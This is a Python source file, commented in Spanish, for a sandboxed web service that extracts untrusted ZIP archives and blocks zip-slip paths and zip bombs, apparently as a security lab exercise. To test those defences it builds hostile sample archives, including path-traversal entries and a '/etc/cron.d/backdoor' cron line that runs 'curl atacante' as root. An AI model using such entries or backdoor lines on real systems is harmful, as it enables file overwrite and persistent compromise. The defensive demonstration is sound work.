#!/usr/bin/env python3
"""Servicio 06 — Extractor de archivos ZIP no confiables.

Este servicio hace **trabajo real**: recibe un ZIP que no controlas, lo extrae
dentro de la jaula y te devuelve su contenido. No informa sobre sí mismo: le
das una entrada y produce una salida.

Y es uno de los casos donde el sandbox no es opcional. Extraer un ZIP ajeno
tiene dos ataques clásicos, los dos con víctimas reales:

**Zip slip.** Una entrada del ZIP se llama `../../../../etc/cron.d/backdoor`.
Al extraer, el archivo aterriza fuera del directorio de destino. Así se han
sobrescrito binarios del sistema y claves autorizadas de SSH.

**Zip bomb.** 42 KB comprimidos que descomprimen a 4,5 PB. Sin techo de memoria
ni de disco, el proceso agota la máquina.

El servicio se defiende de los dos en el código —porque un sandbox no excusa
escribir código descuidado— y además corre dentro de la jaula, que es la
segunda línea: si el filtro fallara, el filesystem del host tampoco está ahí.
Cada extracción reporta qué entradas rechazó y por qué.
"""

from __future__ import annotations

import base64
import html
import http.server
import io
import json
import os
import shutil
import socketserver
import tempfile
import time
import zipfile
from pathlib import Path

PORT = int(os.environ.get("SANDBOX_PORT", "8803"))
RUNTIME = os.environ.get("SANDBOX_RUNTIME", "sin sandbox")

MAX_UPLOAD_BYTES = 8 * 1024 * 1024
MAX_TOTAL_UNCOMPRESSED = 64 * 1024 * 1024
MAX_ENTRIES = 500
MAX_RATIO = 200  # descompresión por encima de esto es una bomba, no un archivo

stats = {"procesados": 0, "entradasRechazadas": 0, "bombasDetectadas": 0}


def unsafe_reason(name: str) -> str | None:
    """Motivo por el que una entrada no debe extraerse, o None si es segura."""
    if name.startswith("/") or (len(name) > 1 and name[1] == ":"):
        return "ruta absoluta"
    parts = Path(name.replace("\\", "/")).parts
    if ".." in parts:
        return "traversal con .."
    if any(part.startswith("/") for part in parts):
        return "componente absoluto"
    return None


def inspect(data: bytes) -> dict:
    """Extrae el ZIP dentro de la jaula y devuelve lo que contenía."""
    started = time.perf_counter()
    try:
        archive = zipfile.ZipFile(io.BytesIO(data))
    except zipfile.BadZipFile:
        return {"error": "el contenido no es un ZIP válido"}

    entries = archive.infolist()
    if len(entries) > MAX_ENTRIES:
        return {"error": f"el archivo trae {len(entries)} entradas; el límite es {MAX_ENTRIES}"}

    declared = sum(entry.file_size for entry in entries)
    compressed = max(sum(entry.compress_size for entry in entries), 1)
    ratio = declared / compressed

    if declared > MAX_TOTAL_UNCOMPRESSED or ratio > MAX_RATIO:
        stats["bombasDetectadas"] += 1
        return {
            "rechazado": "zip bomb",
            "detalle": (
                f"{compressed} bytes comprimidos declaran {declared} al extraer "
                f"(ratio {ratio:.0f}:1, límite {MAX_RATIO}:1)"
            ),
            "extraidas": 0,
        }

    extracted, refused, written = [], [], 0
    workdir = tempfile.mkdtemp(prefix="archive-", dir="/tmp")
    try:
        for entry in entries:
            reason = unsafe_reason(entry.filename)
            if reason:
                refused.append({"entrada": entry.filename, "motivo": reason})
                stats["entradasRechazadas"] += 1
                continue
            if entry.is_dir():
                continue

            target = Path(workdir) / entry.filename
            # Segunda comprobación tras resolver: un enlace o un nombre raro
            # podría seguir saliéndose aunque el filtro anterior lo aprobara.
            resolved = target.resolve()
            if not str(resolved).startswith(str(Path(workdir).resolve())):
                refused.append({"entrada": entry.filename, "motivo": "sale del destino al resolver"})
                stats["entradasRechazadas"] += 1
                continue

            resolved.parent.mkdir(parents=True, exist_ok=True)
            with archive.open(entry) as source, open(resolved, "wb") as sink:
                # Copia con techo: el tamaño declarado en la cabecera puede
                # mentir, así que se corta por lo que de verdad se escribe.
                remaining = MAX_TOTAL_UNCOMPRESSED - written
                chunk = source.read(min(remaining + 1, 1 << 20))
                total = 0
                while chunk:
                    total += len(chunk)
                    written += len(chunk)
                    if written > MAX_TOTAL_UNCOMPRESSED:
                        stats["bombasDetectadas"] += 1
                        return {
                            "rechazado": "zip bomb",
                            "detalle": f"la extracción superó {MAX_TOTAL_UNCOMPRESSED} bytes reales",
                            "extraidas": len(extracted),
                        }
                    sink.write(chunk)
                    chunk = source.read(1 << 20)
            preview = ""
            try:
                preview = resolved.read_text(encoding="utf-8", errors="replace")[:200]
            except OSError:
                preview = "(binario)"
            extracted.append({"nombre": entry.filename, "bytes": total, "vistaPrevia": preview})
    finally:
        shutil.rmtree(workdir, ignore_errors=True)

    stats["procesados"] += 1
    return {
        "extraidas": len(extracted),
        "rechazadas": len(refused),
        "bytesEscritos": written,
        "ratioCompresion": round(ratio, 1),
        "duracionMs": round((time.perf_counter() - started) * 1000, 1),
        "archivos": extracted[:50],
        "entradasRechazadas": refused,
        "runtime": RUNTIME,
    }


def sample_archives() -> dict[str, bytes]:
    """Tres ZIP de ejemplo: uno normal y dos hostiles."""
    samples = {}

    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("informe.txt", "Ventas del trimestre: 1240 unidades.\n")
        zf.writestr("datos/enero.csv", "dia,unidades\n1,40\n2,55\n")
    samples["normal"] = buffer.getvalue()

    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("lectura.txt", "contenido inofensivo\n")
        # La entrada peligrosa: intenta escribir fuera del destino.
        zf.writestr("../../../../tmp/sandbox-labs-pwned.txt", "si lees esto, el zip slip funcionó\n")
        zf.writestr("/etc/cron.d/backdoor", "* * * * * root curl atacante\n")
    samples["zip-slip"] = buffer.getvalue()

    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as zf:
        # 40 MB de ceros comprimen a unos pocos KB: ratio suficiente para que
        # la defensa salte sin necesitar una bomba de verdad.
        zf.writestr("bomba.bin", b"\0" * (40 * 1024 * 1024))
    samples["zip-bomb"] = buffer.getvalue()

    return samples


SAMPLES = sample_archives()

PAGE = """<!DOCTYPE html>
<html lang="es"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"><meta name="color-scheme" content="light dark">
<title>Extractor de ZIP no confiables · sandbox-labs</title>
<style>
:root{{color-scheme:light dark;--bg:#f6f8fc;--panel:#fff;--text:#16202b;--muted:#5b6879;--line:rgba(22,32,43,.14);--ok:#1f7a4f;--bad:#b23131;--warn:#b06a12;--accent:#3b62d9;--code:#1b2330;--codefg:#e8eef7}}
@media(prefers-color-scheme:dark){{:root{{--bg:#0a0f1c;--panel:#131b2b;--text:#eef2fa;--muted:#9fadc4;--line:rgba(158,176,205,.2);--ok:#4fd39b;--bad:#f08a8a;--warn:#e0b055;--accent:#7d9bff;--code:#0a1020;--codefg:#d5e0f5}}}}
*{{box-sizing:border-box}}body{{margin:0;padding:32px 20px;font-family:"Segoe UI",system-ui,sans-serif;background:var(--bg);color:var(--text);line-height:1.55}}
.shell{{max-width:940px;margin:0 auto}}
.card{{background:var(--panel);border:1px solid var(--line);border-radius:20px;padding:28px;box-shadow:0 16px 40px rgba(22,32,43,.1)}}
h1{{margin:0 0 6px;font-size:1.8rem}}.sub{{color:var(--muted);margin:0 0 20px}}
.pill{{display:inline-flex;gap:8px;padding:6px 12px;border-radius:999px;background:rgba(59,98,217,.12);color:var(--accent);font-weight:700;font-size:.82rem;margin-bottom:14px}}
.samples{{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:12px;margin:18px 0}}
.sample{{padding:16px;border:1px solid var(--line);border-radius:16px;background:var(--panel)}}
.sample h3{{margin:0 0 6px;font-size:1rem}}
.sample p{{margin:0 0 12px;color:var(--muted);font-size:.86rem}}
.sample.hostil{{border-color:rgba(178,49,49,.4)}}
button{{padding:10px 16px;border:none;border-radius:999px;background:var(--accent);color:#fff;font:inherit;font-weight:700;cursor:pointer;width:100%}}
button.rojo{{background:var(--bad)}}
button:disabled{{opacity:.6;cursor:wait}}
pre{{margin-top:18px;padding:16px;border-radius:14px;background:var(--code);color:var(--codefg);overflow:auto;max-height:420px;white-space:pre-wrap;word-break:break-word;font-family:Consolas,Monaco,monospace;font-size:.85rem}}
.foot{{margin-top:20px;padding-top:14px;border-top:1px solid var(--line);color:var(--muted);font-size:.86rem}}
code{{background:rgba(59,98,217,.12);padding:2px 6px;border-radius:6px}}
</style></head><body><div class="shell"><div class="card">
<span class="pill">📦 runtime: {runtime}</span>
<h1>Extrae un ZIP que no te fías</h1>
<p class="sub">El archivo se descomprime <b>dentro de la jaula</b>. Prueba con los tres de ejemplo:
uno normal y dos hostiles. También puedes arrastrar el tuyo.</p>
<div class="samples">
  <div class="sample"><h3>📄 Archivo normal</h3><p>Un informe y un CSV. Debe extraerse entero.</p>
    <button data-s="normal">Extraer</button></div>
  <div class="sample hostil"><h3>🪤 Zip slip</h3><p>Trae <code>../../../../tmp/…</code> y <code>/etc/cron.d/…</code>. Debe rechazarlas.</p>
    <button class="rojo" data-s="zip-slip">Extraer</button></div>
  <div class="sample hostil"><h3>💣 Zip bomb</h3><p>40 MB en unos KB. Debe cortarse antes de escribir.</p>
    <button class="rojo" data-s="zip-bomb">Extraer</button></div>
</div>
<input type="file" id="file" accept=".zip">
<pre id="out">El resultado de la extracción aparecerá aquí.</pre>
<p class="foot">Límites: {maxup} MB de subida · {maxout} MB extraídos · {maxent} entradas · ratio {maxratio}:1 ·
<a href="/api/stats">/api/stats</a></p>
</div></div>
<script>
const o=document.getElementById('out');
async function run(body, label) {{
  o.textContent='Extrayendo '+label+'…';
  try {{
    const r=await fetch('/api/extract',{{method:'POST',headers:{{'content-type':'application/octet-stream'}},body}});
    o.textContent=JSON.stringify(await r.json(),null,2);
  }} catch(e) {{ o.textContent='fallo: '+e.message; }}
}}
for (const b of document.querySelectorAll('button[data-s]')) {{
  b.addEventListener('click', async()=>{{
    const r=await fetch('/api/sample/'+b.dataset.s);
    run(await r.arrayBuffer(), b.dataset.s);
  }});
}}
document.getElementById('file').addEventListener('change', async e=>{{
  const f=e.target.files[0]; if(!f) return;
  run(await f.arrayBuffer(), f.name);
}});
</script></body></html>"""


class Handler(http.server.BaseHTTPRequestHandler):
    def _send(self, status: int, body: bytes, content_type: str) -> None:
        self.send_response(status)
        self.send_header("content-type", content_type)
        self.send_header("content-length", str(len(body)))
        self.send_header("cache-control", "no-store")
        self.end_headers()
        self.wfile.write(body)

    def _json(self, status: int, payload: dict) -> None:
        self._send(status, json.dumps(payload, indent=2, ensure_ascii=False).encode(), "application/json; charset=utf-8")

    def do_GET(self) -> None:  # noqa: N802
        if self.path == "/health":
            self._json(200, {"status": "ok", "runtime": RUNTIME})
            return
        if self.path == "/api/stats":
            self._json(200, {**stats, "runtime": RUNTIME})
            return
        if self.path.startswith("/api/sample/"):
            name = self.path.rsplit("/", 1)[-1]
            data = SAMPLES.get(name)
            if not data:
                self._json(404, {"error": "ejemplo desconocido", "disponibles": sorted(SAMPLES)})
                return
            self._send(200, data, "application/zip")
            return
        page = PAGE.format(
            runtime=html.escape(RUNTIME),
            maxup=MAX_UPLOAD_BYTES // (1024 * 1024),
            maxout=MAX_TOTAL_UNCOMPRESSED // (1024 * 1024),
            maxent=MAX_ENTRIES,
            maxratio=MAX_RATIO,
        )
        self._send(200, page.encode(), "text/html; charset=utf-8")

    def do_POST(self) -> None:  # noqa: N802
        if self.path != "/api/extract":
            self._json(404, {"error": "no encontrado"})
            return
        try:
            length = int(self.headers.get("content-length", "0"))
        except ValueError:
            length = 0
        if length <= 0 or length > MAX_UPLOAD_BYTES:
            self._json(413, {"error": f"cuerpo ausente o mayor que {MAX_UPLOAD_BYTES} bytes"})
            return
        data = self.rfile.read(length)
        # Se acepta también base64 para poder probar desde la terminal sin
        # binarios sueltos por la línea de comandos.
        if data[:2] not in (b"PK",):
            try:
                data = base64.b64decode(data, validate=True)
            except (ValueError, TypeError):
                pass
        self._json(200, inspect(data))

    def log_message(self, format: str, *args) -> None:  # noqa: A002
        print(f"{self.address_string()} {format % args}", flush=True)


def main() -> None:
    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("127.0.0.1", PORT), Handler) as server:
        print(f"servicio 06-archive-inspector en 127.0.0.1:{PORT} · runtime={RUNTIME}", flush=True)
        server.serve_forever()


if __name__ == "__main__":
    main()
